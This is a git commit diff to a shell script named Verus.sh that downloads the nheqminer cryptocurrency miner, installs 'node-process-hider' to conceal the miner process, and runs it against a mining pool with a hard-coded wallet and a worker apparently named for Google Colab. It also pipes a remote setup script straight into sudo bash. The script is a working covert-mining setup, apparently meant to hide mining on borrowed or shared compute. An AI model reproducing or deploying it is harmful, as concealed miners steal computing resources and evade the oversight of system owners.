212d15e7a70402dcbe2569044ed0957751c26273
TimBurner0 <102157009+TimBurner0@users.noreply.github.com>
2022-03-22 22:13:56 +0530

    Update Verus.sh

--- Verus.sh
+++ Verus.sh
@@ -2,6 +2,6 @@ sudo apt update
 clear
 sudo apt install screen
 screen -R nheqminer
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xf nheqminer-Linux-v0.8.2.tgz &&  tar -xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && sudo ph add nheqminer && apt install screen && screen 
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xf nheqminer-Linux-v0.8.2.tgz &&  tar -xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && sudo ph add nheqminer && apt install screen && screen 
 screen
 sudo ./nheqminer -v -l na.luckpool.net:3956 -u RSC1ZnrrkGLuperMYD4Ta6FYnG7jFfuf4T.colab2 -t 10
